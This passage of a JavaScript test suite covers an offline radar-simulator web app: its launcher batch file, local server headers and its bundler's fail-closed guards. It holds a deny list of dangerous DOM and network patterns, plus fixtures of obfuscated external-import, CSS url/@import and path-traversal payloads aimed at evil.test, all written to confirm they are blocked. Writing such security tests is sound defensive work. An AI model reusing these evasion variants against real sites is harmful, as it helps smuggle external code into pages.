    'id="btn-ent"', 'data-control="ent"',
    'id="pad-up"', 'id="pad-left"', 'id="pad-right"', 'id="pad-down"', 'data-control="cursorpad"',
    'id="btn-range-down"', 'id="btn-range-up"', 'id="btn-alarm-ack"',
    'id="gain-knob"', 'data-control="gain"',
    'id="stc-knob"', 'data-control="stc"',
    'id="btn-stby-tx"', 'id="tx-led"', 'data-control="stby_tx"',
    'id="btn-power"', 'data-control="power"',
  ]) {
    assert.ok(html.includes(marker), `Missing MRD-104 control attribute ${marker}`);
  }

  // 5 D15 ARIA tabs & panels
  const tabPairs = [
    ["d15-tab-session", "d15-panel-session"],
    ["d15-tab-weather", "d15-panel-weather"],
    ["d15-tab-arpa", "d15-panel-arpa"],
    ["d15-tab-lessons", "d15-panel-lessons"],
    ["d15-tab-settings", "d15-panel-settings"],
  ];
  for (const [tabId, panelId] of tabPairs) {
    assert.match(html, new RegExp(`id="${tabId}"[^>]*role="tab"[^>]*aria-controls="${panelId}"`));
    assert.match(html, new RegExp(`id="${panelId}"[^>]*role="tabpanel"[^>]*aria-labelledby="${tabId}"`));
  }

  // Polite off-LCD live rail (.d15-live-rail + .sr-only status regions)
  assert.match(html, /class="d15-live-rail"/);
  assert.match(
    html,
    /id="d15-live-status"\s+class="sr-only"\s+role="status"\s+aria-live="polite"\s+aria-atomic="true"/,
  );
  assert.match(
    html,
    /id="d15-alarm-status"\s+class="sr-only"\s+role="status"\s+aria-live="polite"\s+aria-atomic="true"/,
  );

  // Zero dangerous DOM/eval/network/import.meta patterns across all 5 web/mdc2060/* files
  const forbiddenPatterns = [
    [/\binnerHTML\s*=/, "innerHTML assignment"],
    [/\bouterHTML\s*=/, "outerHTML assignment"],
    [/\binsertAdjacentHTML\b/, "insertAdjacentHTML"],
    [/\bdocument\.write\b/, "document.write"],
    [/\beval\s*\(/, "eval()"],
    [/\bnew\s+Function\b/, "new Function"],
    [/\bimport\.meta\b/, "import.meta"],
    [/\bfetch\s*\(/, "fetch()"],
    [/\bWebSocket\b/, "WebSocket"],
    [/\bXMLHttpRequest\b/, "XMLHttpRequest"],
    [/\bnavigator\.serial\b/, "navigator.serial"],
    [/\bnavigator\.usb\b/, "navigator.usb"],
    [/https?:\/\//i, "external http(s) URL"],
  ];
  for (const rel of [
    "web/mdc2060/index.html",
    "web/mdc2060/styles.css",
    "web/mdc2060/ppi-renderer.mjs",
    "web/mdc2060/input-controls.mjs",
    "web/mdc2060/app.mjs",
  ]) {
    const src = await readFile(path.join(ROOT, rel), "utf8");
    for (const [rx, desc] of forbiddenPatterns) {
      assert.doesNotMatch(src, rx, `${rel} must not contain ${desc}`);
    }
  }

  // FCV-588 non-regression: web/index.html must never mention MDC-2060 or KODEN J2000
  const fcvHtml = await readFile(path.join(ROOT, "web/index.html"), "utf8");
  assert.doesNotMatch(fcvHtml, /MDC-2060|KODEN J2000/i);
});

test("Chay-MDC2060.bat mirrors Chay-FCV588.bat with AUD-02 safe delayed expansion, flat cmd.exe expansion safety, and /mdc2060 fallback", async () => {
  const batPath = path.join(ROOT, "Chay-MDC2060.bat");
  const st = await stat(batPath);
  assert.ok(st.isFile() && st.size > 100, "Chay-MDC2060.bat must exist and be non-empty");
  const bat = await readFile(batPath, "utf8");

  assert.match(bat, /^@echo off\r?\n/);
  assert.match(bat, /setlocal EnableExtensions/);
  assert.match(bat, /chcp 65001/);
  assert.match(bat, /dist\\MDC-2060-Standalone\.html/);
  assert.match(bat, /tools\\build_mdc2060_standalone\.mjs/);
  assert.match(bat, /setlocal EnableDelayedExpansion/);
  assert.match(bat, /set "FILE_URI=!FILE_URI: =%%20!"/);
  assert.doesNotMatch(bat, /%%%%20%%/);
  assert.match(bat, /--app="%FILE_URI%" --window-size=1450,920/);
  assert.match(bat, /http:\/\/127\.0\.0\.1:4173\/mdc2060/);
  assert.match(bat, /node "%~dp0tools\\server\.mjs"/);
  assert.match(bat, /goto :fallback_server/i);
  assert.match(bat, /^:fallback_server\s*$/m);
  assert.match(bat, /goto :missing_runtime/i);
  assert.match(bat, /^:missing_runtime\s*$/m);

  // Verify all 6 standard Edge/Chrome lookup paths remain intact
  for (const browserPath of [
    "%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe",
    "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe",
    "%LocalAppData%\\Microsoft\\Edge\\Application\\msedge.exe",
    "%ProgramFiles%\\Google\\Chrome\\Application\\chrome.exe",
    "%ProgramFiles(x86)%\\Google\\Chrome\\Application\\chrome.exe",
    "%LocalAppData%\\Google\\Chrome\\Application\\chrome.exe",
  ]) {
    assert.ok(bat.includes(browserPath), `Missing browser lookup path: ${browserPath}`);
  }

  // Static cmd.exe compound-block parse-time %VAR% expansion regression check (DEFECT-1)
  const parsed = parseBatchCompoundBlocks(bat);
  assert.equal(parsed.finalDepth, 0, "Chay-MDC2060.bat must have balanced compound-block parentheses");

  const appLaunchLine = parsed.lines.find(line =>
    line.trimmed.includes('start "" "%BROWSER_EXE%" --app="%FILE_URI%"'),
  );
  assert.ok(appLaunchLine, "Expected Edge/Chrome --app launch command in Chay-MDC2060.bat");
  for (const blk of appLaunchLine.enclosingBlocks) {
    const blockBody = blk.lines.map(l => l.trimmed).join("\n");
    assert.doesNotMatch(
      blockBody,
      /\bset\s+"?FILE_URI=/i,
      `Line ${appLaunchLine.lineNo} expands %FILE_URI% inside an enclosing block (line ${blk.startLine}) that sets FILE_URI`,
    );
    assert.doesNotMatch(
      blockBody,
      /\bset\s+"?BROWSER_EXE=/i,
      `Line ${appLaunchLine.lineNo} expands %BROWSER_EXE% inside an enclosing block (line ${blk.startLine}) that sets BROWSER_EXE`,
    );
    assert.doesNotMatch(
      blockBody,
      /\bcall\s+:find_browser\b/i,
      `Line ${appLaunchLine.lineNo} expands %BROWSER_EXE% inside an enclosing block (line ${blk.startLine}) that calls :find_browser`,
    );
  }

  const serverNodeLine = parsed.lines.find(line => line.trimmed === 'node "%~dp0tools\\server.mjs"');
  const exitErrLine = parsed.lines.find(line => /^exit\s+\/b\s+%errorlevel%$/i.test(line.trimmed));
  assert.ok(serverNodeLine, "Expected fallback server launch command in Chay-MDC2060.bat");
  assert.ok(exitErrLine, "Expected exit /b %errorlevel% in Chay-MDC2060.bat");
  assert.equal(
    serverNodeLine.depth,
    0,
    `Fallback node server launch (line ${serverNodeLine.lineNo}) must run at top level (depth 0)`,
  );
  assert.equal(
    exitErrLine.depth,
    0,
    `exit /b %errorlevel% (line ${exitErrLine.lineNo}) must run at top level (depth 0) so cmd.exe expands live errorlevel after node exits`,
  );
  assert.ok(
    exitErrLine.lineNo > serverNodeLine.lineNo,
    "exit /b %errorlevel% must execute after node server.mjs",
  );
});

test("tools/server.mjs serves /mdc2060 and /mdc2060/ with hardened headers while preserving FCV-588 / and blocking traversal", {timeout: 16000}, async () => {
  const srv = await startLocalServer();
  try {
    const expectedHtml = await readFile(path.join(ROOT, "web/mdc2060/index.html"), "utf8");

    for (const route of ["/mdc2060", "/mdc2060/"]) {
      const res = await fetch(`${srv.origin}${route}`);
      assert.equal(res.status, 200, route);
      assert.equal(res.headers.get("content-type"), "text/html; charset=utf-8");
      const csp = res.headers.get("content-security-policy") ?? "";
      assert.match(csp, /default-src 'self'/);
      assert.match(csp, /connect-src 'none'/);
      assert.match(csp, /form-action 'none'/);
      assert.match(csp, /frame-src 'none'/);
      assert.match(csp, /worker-src 'none'/);
      assert.equal(res.headers.get("referrer-policy"), "no-referrer");
      assert.equal(
        res.headers.get("permissions-policy"),
        "geolocation=(), microphone=(), camera=(), usb=(), serial=(), bluetooth=()",
      );
      assert.equal(res.headers.get("x-content-type-options"), "nosniff");
      assert.equal(res.headers.get("cache-control"), "no-store");
      assert.equal(await res.text(), expectedHtml);
    }

    const headRes = await fetch(`${srv.origin}/mdc2060`, {method: "HEAD"});
    assert.equal(headRes.status, 200);
    assert.equal(headRes.headers.get("content-type"), "text/html; charset=utf-8");
    assert.equal(headRes.headers.get("x-content-type-options"), "nosniff");
    assert.equal(await headRes.text(), "");

    const postRes = await fetch(`${srv.origin}/mdc2060`, {method: "POST"});
    assert.equal(postRes.status, 405);

    // Traversal & dot-segments blocked
    assert.equal((await fetch(`${srv.origin}/web/mdc2060/.hidden.js`)).status, 403);
    assert.equal((await fetch(`${srv.origin}/web/mdc2060/%2e%2e%2f%2e%2e%2fpackage.json`)).status, 403);
    assert.equal((await fetch(`${srv.origin}/mdc2060/%2e%2e/package.json`)).status, 404);
    assert.equal((await fetch(`${srv.origin}/mdc2060/nonexistent`)).status, 404);

    // FCV-588 root route remains intact
    const fcvRes = await fetch(`${srv.origin}/`);
    assert.equal(fcvRes.status, 200);
    assert.match(await fcvRes.text(), /<h1\b[^>]*>FCV-588/);
  } finally {
    await srv.close();
  }
});

test("build_mdc2060_standalone.mjs tokenizer, specifier finder, and fail-closed negative guards work accurately", async () => {
  const sample = [
    "// import fake from './comment.mjs';",
    "/* export * from './block-comment.mjs'; */",
    "import {\n  alpha,\n  from as aliasedFrom,\n} from \"../src/core/protocol.mjs\";",
    "import * as ns from './local-ns.mjs';",
    "import './side-effect.mjs';",
    "export {\n  alpha as beta\n} from './reexport.mjs';",
    "export * as starNs from './star-reexport.mjs';",
    "const dyn = () => import('./dynamic.mjs');",
    "const objCall = obj.import('./ignored-method.mjs');",
    "const str = \"import x from './inside-string.mjs'\";",
    "const tpl = `prefix ${`import y from './inside-tpl.mjs'`} suffix`;",
    "const rx = /import z from '.\\/inside-regex.mjs'/g;",
    "export function keepLocal() { const from = './not-an-import.mjs'; return from; }",
  ].join("\n");

  const tokens = tokenizeModule(sample);
  assert.ok(tokens.some(t => t.type === "regex"));
  assert.ok(tokens.some(t => t.type === "string" && t.value === "../src/core/protocol.mjs"));

  const found = findModuleSpecifiers(sample).map(t => t.value);
  assert.deepEqual(found, [
    "../src/core/protocol.mjs",
    "./local-ns.mjs",
    "./side-effect.mjs",
    "./reexport.mjs",
    "./star-reexport.mjs",
    "./dynamic.mjs",
  ]);

  // DEFECT-I2-1: spread operator `...` emits a single punctuator token so ...import(...) is extracted
  const spreadTokens = tokenizeModule('const a = {...import("./dyn.mjs")};');
  assert.ok(
    spreadTokens.some(t => t.type === "punct" && t.value === "..."),
    "tokenizeModule must emit '...' as a single punctuator token",
  );
  assert.deepEqual(
    findModuleSpecifiers('const a = {...import("./dyn.mjs")};').map(t => t.value),
    ["./dyn.mjs"],
  );
  assert.deepEqual(
    findModuleSpecifiers('obj.import("./ignored.mjs"); obj?.import("./ignored-opt.mjs");').map(t => t.value),
    [],
  );

  // DEFECT-I2-2: ECMAScript Unicode whitespace (NBSP, BOM, Zs) and U+2028/U+2029 line terminators
  assert.deepEqual(
    findModuleSpecifiers('import\u00A0{a}\u00A0from\u00A0"./dep.mjs";').map(t => t.value),
    ["./dep.mjs"],
  );
  assert.deepEqual(
    findModuleSpecifiers('// c\u2028import\uFEFF{b}\u3000from\u00A0"./dep2.mjs";').map(t => t.value),
    ["./dep2.mjs"],
  );

  // Negative fail-closed tests on isolated temp roots
  const tmpBase = await mkdtemp(path.join(os.tmpdir(), "mdc2060-bundler-neg-"));
  try {
    // 1. Runtime import.meta (direct, spaced/commented/newline, spread `...`, and Unicode ws/U+2028/U+2029) rejected
    const importMetaPayloads = [
      ["direct", "export const u = import.meta.url;\n"],
      ["block-comment-before-dot", "export const u = import /* c */ .meta.url;\n"],
      ["space-before-dot", "export const u = import .meta.url;\n"],
      ["newline-before-dot", "export const u = import\n.meta.url;\n"],
      ["comment-after-dot", "export const u = import. /* c */ meta.url;\n"],
      ["spread-object", "export const m = {...import.meta};\n"],
      ["spread-array", "export const u = [...import.meta.url];\n"],
      ["unicode-nbsp", "export const u = import\u00A0.meta.url;\n"],
      ["unicode-bom", "export const u = import\uFEFF.meta.url;\n"],
      ["unicode-ls-2028", "export const u = import\u2028.meta.url;\n"],
      ["unicode-ps-2029", "export const u = import\u2029.meta.url;\n"],
      ["unicode-ideographic-3000", "export const u = import\u3000.meta.url;\n"],
      ["line-comment-2028", "// c\u2028export const u = import.meta.url;\n"],
      ["line-comment-2029", "// c\u2029export const u = import.meta.url;\n"],
    ];
    for (const [slug, appSource] of importMetaPayloads) {
      const rootMeta = path.join(tmpBase, `import-meta-${slug}`);
      await createMinimalBundleFixture(rootMeta, {minModules: 20, appSource});
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootMeta, write: false}),
        /Unsupported runtime import\.meta/,
        `Expected fail-closed rejection for import.meta variant: ${slug}`,
      );
    }

    // 2. Comments, strings, templates, and property access obj.import.meta do NOT false-positive
    const rootSafeMeta = path.join(tmpBase, "safe-import-meta");
    await createMinimalBundleFixture(rootSafeMeta, {
      minModules: 20,
      appSource: [
        "// import.meta.url is only in a line comment",
        "/* import /* c * / .meta.url */",
        "export const s1 = \"import.meta.url\";",
        "export const s2 = `import.meta.url`;",
        "export const readProp = (obj) => obj.import.meta;",
        "export const readOptProp = (obj) => obj?.import.meta;",
      ].join("\n") + "\n",
    });
    const safeMetaRes = await buildStandaloneHtml({rootDir: rootSafeMeta, write: false});
    assert.equal(safeMetaRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(safeMetaRes.modulesBundled, 20);

    // 2b. Spread dynamic import & Unicode whitespace local imports are bundled and rewritten (DEFECT-I2-1, DEFECT-I2-2)
    const rootSpreadLocal = path.join(tmpBase, "spread-local-dep");
    await createMinimalBundleFixture(rootSpreadLocal, {
      minModules: 20,
      appSource: [
        'import\u00A0{uVal}\u00A0from\u00A0"./unicode_dep.mjs";',
        'export const spreadDyn = () => ({...import("./dep.mjs"), uVal});',
        'export const ignoredCall = (obj) => obj.import("./ignored.mjs");',
      ].join("\n") + "\n",
      extraFiles: [
        {rel: "web/mdc2060/dep.mjs", content: "export const depVal = 42;\n"},
        {rel: "web/mdc2060/unicode_dep.mjs", content: "export const uVal = 99;\n"},
      ],
    });
    const spreadLocalRes = await buildStandaloneHtml({rootDir: rootSpreadLocal, write: false});
    assert.equal(spreadLocalRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(spreadLocalRes.modulesBundled, 22);
    const spreadMapMatch = spreadLocalRes.html.match(/<script type="importmap">([\s\S]*?)<\/script>/);
    assert.ok(spreadMapMatch, "Expected importmap in spread/unicode fixture bundle");
    const spreadImportMap = JSON.parse(spreadMapMatch[1]);
    assert.ok(Object.hasOwn(spreadImportMap.imports, "mdc2060://web/mdc2060/dep.mjs"));
    assert.ok(Object.hasOwn(spreadImportMap.imports, "mdc2060://web/mdc2060/unicode_dep.mjs"));
    const appDataUrl = spreadImportMap.imports["mdc2060://web/mdc2060/app.mjs"];
    const decodedApp = Buffer.from(
      appDataUrl.slice("data:text/javascript;charset=utf-8;base64,".length),
      "base64",
    ).toString("utf8");
    assert.ok(decodedApp.includes('{...import("mdc2060://web/mdc2060/dep.mjs")'));
    assert.ok(decodedApp.includes('from\u00A0"mdc2060://web/mdc2060/unicode_dep.mjs"'));
    assert.ok(decodedApp.includes('obj.import("./ignored.mjs")'));

    // 3. Bare/external specifiers rejected (direct, spread dynamic import, Unicode ws, U+2028/U+2029 comments)
    const bareSpecPayloads = [
      ["direct", "import 'https://example.com/external.mjs';\n"],
      ["spread-dynamic", 'export const leak = {...import("https://evil.test/x.mjs")};\n'],
      ["unicode-nbsp-side-effect", 'import\u00A0"https://evil.test/x.mjs";\n'],
      ["unicode-nbsp-dynamic", 'export const d = import\u00A0("https://evil.test/x.mjs");\n'],
      ["unicode-nbsp-export-star", 'export\u00A0*\u00A0from\u00A0"https://evil.test/x.mjs";\n'],
      ["line-comment-2028", '// c\u2028import "https://evil.test/x.mjs";\n'],
      ["line-comment-2029", '// c\u2029import "https://evil.test/x.mjs";\n'],
    ];
    for (const [slug, appSource] of bareSpecPayloads) {
      const rootBare = path.join(tmpBase, `bare-spec-${slug}`);
      await createMinimalBundleFixture(rootBare, {minModules: 20, appSource});
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootBare, write: false}),
        /Unsupported bare\/external specifier/,
        `Expected fail-closed rejection for external specifier variant: ${slug}`,
      );
    }

    // 4. Path escape rejected
    const rootEscape = path.join(tmpBase, "path-escape");
    await createMinimalBundleFixture(rootEscape, {
      appSource: "import '../../../package.json';\n",
    });
    await assert.rejects(
      () => buildStandaloneHtml({rootDir: rootEscape, write: false}),
      /escapes src\/ and web\//,
    );

    // 5. Forbidden runtime extension rejected
    const rootExt = path.join(tmpBase, "bad-ext");
    await createMinimalBundleFixture(rootExt, {
      extraFiles: [{rel: "web/mdc2060/disallowed.png", content: "not-a-png"}],
    });
    await assert.rejects(
      () => buildStandaloneHtml({rootDir: rootExt, write: false}),
      /Forbidden runtime asset type/,
    );

    // 6. Hidden file rejected
    const rootHidden = path.join(tmpBase, "hidden-file");
    await createMinimalBundleFixture(rootHidden, {
      extraFiles: [{rel: "web/mdc2060/.secret.mjs", content: "export const s = 1;\n"}],
    });
    await assert.rejects(
      () => buildStandaloneHtml({rootDir: rootHidden, write: false}),
      /Forbidden hidden or symlink asset/,
    );

    // 7. Nested symlink rejected
    const rootSym = path.join(tmpBase, "symlink-file");
    await createMinimalBundleFixture(rootSym);
    await symlink(
      path.join(rootSym, "web/mdc2060/app.mjs"),
      path.join(rootSym, "web/mdc2060/alias.mjs"),
    );
    await assert.rejects(
      () => buildStandaloneHtml({rootDir: rootSym, write: false}),
      /Forbidden hidden or symlink asset/,
    );

    // 8. Symlinked top-level web/ and src/ directories rejected fail-closed (DEFECT-4)
    const outsideWebRoot = path.join(tmpBase, "outside-web-target");
    await createMinimalBundleFixture(outsideWebRoot, {minModules: 20});
    const rootSymWeb = path.join(tmpBase, "symlink-top-web");
    await mkdir(path.join(rootSymWeb, "src"), {recursive: true});
    await symlink(path.join(outsideWebRoot, "web"), path.join(rootSymWeb, "web"));
    await assert.rejects(
      () => buildStandaloneHtml({rootDir: rootSymWeb, write: false}),
      /Forbidden hidden or symlink asset: web/,
    );

    const rootSymSrc = path.join(tmpBase, "symlink-top-src");
    await createMinimalBundleFixture(rootSymSrc, {minModules: 20});
    await rm(path.join(rootSymSrc, "src"), {recursive: true, force: true});
    await symlink(path.join(outsideWebRoot, "src"), path.join(rootSymSrc, "src"));
    await assert.rejects(
      () => buildStandaloneHtml({rootDir: rootSymSrc, write: false}),
      /Forbidden hidden or symlink asset: src/,
    );

    // 9. CSS URL(...), @import, comments in url(), CSS backslash escapes outside strings/comments,
    //    and comment-separated tokens fail-closed (DEFECT-3, DEFECT-I2-3, DEFECT-I3-1, DEFECT-I3-2)
    const cssRejectCases = [
      ["upper-ext", 'body { background: URL("https://evil.test/x.svg"); }\n', /Unsupported bare\/external specifier/],
      ["upper-png", 'body { background: URL("./bad.png"); }\n', /Unsupported CSS asset URL/],
      ["mixed-png", 'body { background: Url("./bad.png"); }\n', /Unsupported CSS asset URL/],
      ["at-import-ext", '@import "https://evil.test/x.css";\nbody { color: red; }\n', /Unsupported CSS @import/],
      ["at-import-upper-rel", '@IMPORT "./extra.css";\nbody { color: red; }\n', /Unsupported CSS @import/],
      ["at-import-escaped", '@\\69mport "https://evil.test/x.css";\nbody { color: red; }\n', /Unsupported CSS @import/],
      ["at-import-comment", '@/*c*/import "https://evil.test/x.css";\n', /Unsupported CSS @import/],
      ["at-import-url", '@import url("https://evil.test/x.css");\n', /Unsupported CSS @import/],
      ["url-trailing-comment", 'body { background: url("https://evil.test/x.svg" /* c */); }\n', /Unsupported bare\/external specifier/],
      ["url-trailing-comment-paren", 'body { background: url("https://evil.test/x.svg" /* ) */); }\n', /Unsupported bare\/external specifier/],
      ["url-unquoted-comment", 'body { background: url(https://evil.test/x.svg/*c*/); }\n', /Unsupported bare\/external specifier/],
      ["url-escaped-hex", 'body { background: \\75rl("https://evil.test/x.svg"); }\n', /Unsupported escaped CSS url\(\)/],
      ["url-escaped-mid", 'body { background: u\\72l("./bad.png"); }\n', /Unsupported escaped CSS url\(\)/],
      ["url-escaped-spaced-hex", 'body { background: \\75 \\72 \\6c ("https://evil.test/x.svg"); }\n', /Unsupported escaped CSS url\(\)/],
      ["image-set-ext", 'body { background-image: image-set("https://evil.test/x.svg" 1x); }\n', /Unsupported CSS image-set\(\)/],
      // DEFECT-I3-1: CSS backslash escapes outside strings/comments (\", \', \/*)
      ["esc-layer-dquote-import", '@layer a\\"b; @import "https://evil.test/x.css";\n', /Unsupported CSS @import/],
      ["esc-layer-squote-import", '@layer a\\\'; @import "https://evil.test/x.css";\n', /Unsupported CSS @import/],
      ["esc-sel-dquote-url", '.a\\" , body { background-image: url("https://evil.test/x.svg"); }\n', /Unsupported bare\/external specifier/],
      ["esc-sel-squote-url", '.a\\\' , body { background-image: url("https://evil.test/x.svg"); }\n', /Unsupported bare\/external specifier/],
      ["esc-var-dquote-hex-url", 'body { --x: \\"; background-image: \\75rl("https://evil.test/x.svg"); }\n', /Unsupported escaped CSS url\(\)/],
      ["esc-var-dquote-image-set", 'body { --x: \\"; background-image: image-set("https://evil.test/x.svg" 1x); }\n', /Unsupported CSS image-set\(\)/],
      ["esc-sel-slash-star-url", '.x\\/* { color: red; }\nbody { background-image: url("https://evil.test/x.svg"); }\n/* end */\n', /Unsupported bare\/external specifier/],
      ["esc-var-slash-star-url", ':root { --x: \\/*; }\nbody { background-image: url("https://evil.test/x.svg"); }\n', /Unsupported bare\/external specifier/],
      // DEFECT-I3-2: CSS comments must separate adjacent tokens in skeleton
      ["comment-sep-escaped-url", 'body { background: no-repeat/*c*/\\75rl("https://evil.test/x.svg"); }\n', /Unsupported escaped CSS url\(\)/],
      ["comment-sep-image-set", 'body { background: no-repeat/*c*/image-set("https://evil.test/x.svg" 1x); }\n', /Unsupported CSS image-set\(\)/],
      ["comment-sep-webkit-image-set", 'body { background: 0/*c*/-webkit-image-set("https://evil.test/x.svg" 1x); }\n', /Unsupported CSS -webkit-image-set\(\)/],
      ["comment-sep-import-escaped-url", '@import/*c*/\\75rl("https://evil.test/x.css");\n', /Unsupported CSS @import/],
    ];
    for (const [slug, stylesCss, expectedRe] of cssRejectCases) {
      const rootCssReject = path.join(tmpBase, `css-reject-${slug}`);
      await createMinimalBundleFixture(rootCssReject, {minModules: 20, stylesCss});
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootCssReject, write: false}),
        expectedRe,
        `Expected fail-closed rejection for CSS case: ${slug}`,
      );
    }

    const iconSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><circle cx="4" cy="4" r="3"/></svg>\n';
    const expectedIconB64 = Buffer.from(iconSvg, "utf8").toString("base64");
    const rootCssSvg = path.join(tmpBase, "css-upper-svg");
    await createMinimalBundleFixture(rootCssSvg, {
      minModules: 20,
      stylesCss: [
        'body { background-image: URL("./icon.svg"); }',
        '.comment-url { background-image: url("./icon.svg" /* c */); }',
        '.unquoted-comment-url { background-image: url(./icon.svg/*c*/); }',
        '.icon-\\"q, .after-esc-quote { background-image: url("./icon.svg"); }',
        ':root { --x: \\/*; }',
        '.after-esc-slash-star { background-image: url("./icon.svg"); }',
        'body::before { content: "x\\\\"; } /* ok */',
        '.inline-data { background-image: URL("DATA:image/svg+xml;base64,PHN2Zz48L3N2Zz4="); }',
        'body::after { content: "@import \\\\75rl(x) url(https://ignored.example/x.png)"; } /* @import "ignored.css" url("https://ignored.example/y.png") */',
        '.foo\\@import { color: red; }',
      ].join("\n") + "\n",
      extraFiles: [{rel: "web/mdc2060/icon.svg", content: iconSvg}],
    });
    const cssSvgRes = await buildStandaloneHtml({rootDir: rootCssSvg, write: false});
    assert.equal(cssSvgRes.status, "STANDALONE_HTML_CHECK_PASS");
    const expectedDataUrl = `url("data:image/svg+xml;base64,${expectedIconB64}")`;
    assert.equal(
      cssSvgRes.html.split(expectedDataUrl).length - 1,
      5,
      "All 5 local SVG url() variants (URL(), quoted/unquoted with comments, and after \\\" or \\/* escapes) must be inlined as base64 SVG data URIs",
    );
    assert.doesNotMatch(cssSvgRes.html, /url\([^)]*icon\.svg/i);
    assert.ok(
      cssSvgRes.html.includes('URL("DATA:image/svg+xml;base64,PHN2Zz48L3N2Zz4=")'),
      "Case-insensitive DATA: URI in CSS must be preserved",
    );
    assert.ok(
      cssSvgRes.html.includes('content: "@import \\\\75rl(x) url(https://ignored.example/x.png)"'),
      "CSS string content containing @import / escaped url must not false-positive",
    );

    // 10. Missing <meta charset="utf-8"> fails closed on CSP injection
    const rootNoCharset = path.join(tmpBase, "no-charset");
    await createMinimalBundleFixture(rootNoCharset, {includeCharset: false});
    await assert.rejects(
      () => buildStandaloneHtml({rootDir: rootNoCharset, write: false}),
      /Failed to inject offline Content-Security-Policy/,
    );

    // 11. DEFECT-I3-3: ECMAScript Unicode & escaped identifiers (positive division + fail-closed regex-desync prevention)
    const rootUnicodeIdentsOk = path.join(tmpBase, "unicode-idents-ok");
    await createMinimalBundleFixture(rootUnicodeIdentsOk, {
      minModules: 20,
      appSource: [
        "const độ = 10; export const half = độ / 2;",
        "export const next = 1;",
        "const π = 3.14; export const r = π / 2;",
        "const \\u03b1 = 8; export const q = \\u03b1 / 2;",
        "const 𐀀 = 4; export const astral = 𐀀 / 2;",
        "export const ok = 1;",
      ].join("\n") + "\n",
    });
    const unicodeOkRes = await buildStandaloneHtml({rootDir: rootUnicodeIdentsOk, write: false});
    assert.equal(unicodeOkRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(unicodeOkRes.modulesBundled, 20);

    const unicodeRejectCases = [
      ["greek-import-meta", "const α = 2; export const r = (α / 2, import.meta.url, 4 / 2);\n", /Unsupported runtime import\.meta/],
      ["greek-ext-import", 'const α = 2; export const p = (α / 2, import("https://evil.test/x.mjs"), 4 / 2);\n', /Unsupported bare\/external specifier/],
      ["escaped-ident-import-meta", "const \\u03b1 = 2; export const r = (\\u03b1 / 2, import.meta.url, 4 / 2);\n", /Unsupported runtime import\.meta/],
    ];
    for (const [slug, appSource, expectedRe] of unicodeRejectCases) {
      const rootUniRej = path.join(tmpBase, `unicode-reject-${slug}`);
      await createMinimalBundleFixture(rootUniRej, {minModules: 20, appSource});
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootUniRej, write: false}),
        expectedRe,
        `Expected fail-closed rejection for Unicode identifier case: ${slug}`,
      );
    }

    // 12. DEFECT-I3-4: Non-static dynamic import() fail-closed rejection while preserving method definitions & static imports
    const dynImportRejectCases = [
      ["template-ext", "export const p = import(`https://evil.test/x.mjs`);\n", /Unsupported non-static dynamic import\(\) specifier/],
      ["template-local", "export const p = import(`./dep.mjs`);\n", /Unsupported non-static dynamic import\(\) specifier/],
      ["parenthesized", 'export const p = import(("https://evil.test/x.mjs"));\n', /Unsupported non-static dynamic import\(\) specifier/],
      ["compound-and", 'export const p = import("./dep.mjs" && "https://evil.test/x.mjs");\n', /Unsupported non-static dynamic import\(\) specifier/],
      ["variable", "const urlVar = './dep.mjs'; export const p = import(urlVar);\n", /Unsupported non-static dynamic import\(\) specifier/],
      ["empty", "export const p = import();\n", /Unsupported non-static dynamic import\(\) specifier/],
      ["asi-block-after-ext", 'import("https://evil.test/x.mjs")\n{ const a = 1; }\n', /Unsupported bare\/external specifier/],
      ["asi-block-after-var", "const urlVar = 'x'; import(urlVar)\n{ const a = 1; }\n", /Unsupported non-static dynamic import\(\) specifier/],
      ["nested-method-default", 'class C { import(x = import("https://evil.test/x.mjs")) { return x; } }\n', /Unsupported bare\/external specifier/],
      ["nested-second-arg", 'export const p = import("./dep.mjs", { with: { type: import("https://evil.test/x.mjs") } });\n', /Unsupported bare\/external specifier/],
    ];
    for (const [slug, appSource, expectedRe] of dynImportRejectCases) {
      const rootDynRej = path.join(tmpBase, `dyn-import-reject-${slug}`);
      await createMinimalBundleFixture(rootDynRej, {
        minModules: 20,
        appSource,
        extraFiles: [{rel: "web/mdc2060/dep.mjs", content: "export const dep = 1;\n"}],
      });
      await assert.rejects(
        () => buildStandaloneHtml({rootDir: rootDynRej, write: false}),
        expectedRe,
        `Expected fail-closed rejection for dynamic import case: ${slug}`,
      );
    }

    const rootDynOk = path.join(tmpBase, "dyn-import-valid");
    await createMinimalBundleFixture(rootDynOk, {
      minModules: 20,
      appSource: [
        "export class C { import(x) { return x; } }",
        "export const o = { import(y) { return y; } };",
        'export const p = import("./dep.mjs");',
        'export const pWithAttrs = import("./dep.mjs", { with: { type: "javascript" } });',
      ].join("\n") + "\n",
      extraFiles: [{rel: "web/mdc2060/dep.mjs", content: "export const dep = 42;\n"}],
    });
    const dynOkRes = await buildStandaloneHtml({rootDir: rootDynOk, write: false});
    assert.equal(dynOkRes.status, "STANDALONE_HTML_CHECK_PASS");
    assert.equal(dynOkRes.modulesBundled, 21);
    const dynMap = JSON.parse(dynOkRes.html.match(/<script type="importmap">([\s\S]*?)<\/script>/)[1]);
    assert.ok(Object.hasOwn(dynMap.imports, "mdc2060://web/mdc2060/dep.mjs"));
    const dynDecodedApp = Buffer.from(
      dynMap.imports["mdc2060://web/mdc2060/app.mjs"].slice("data:text/javascript;charset=utf-8;base64,".length),
      "base64",
    ).toString("utf8");
    assert.ok(dynDecodedApp.includes('export const p = import("mdc2060://web/mdc2060/dep.mjs");'));
    assert.ok(dynDecodedApp.includes('export const pWithAttrs = import("mdc2060://web/mdc2060/dep.mjs", { with: { type: "javascript" } });'));

    // 13. DEFECT-I3-5: Context-aware canStartRegex after control-flow ) & block } + unescaped string newline rejection
    const rootControlFlowOk = path.join(tmpBase, "control-flow-regex-ok");
    await createMinimalBundleFixture(rootControlFlowOk, {
      minModules: 20,
      appSource: [
        'const a = "x";',
        'if (true) /"/.test(a);',
        "export const ok = (1 + 2) / 3;",
        '{ const k = 1; } /"/.test(a);',
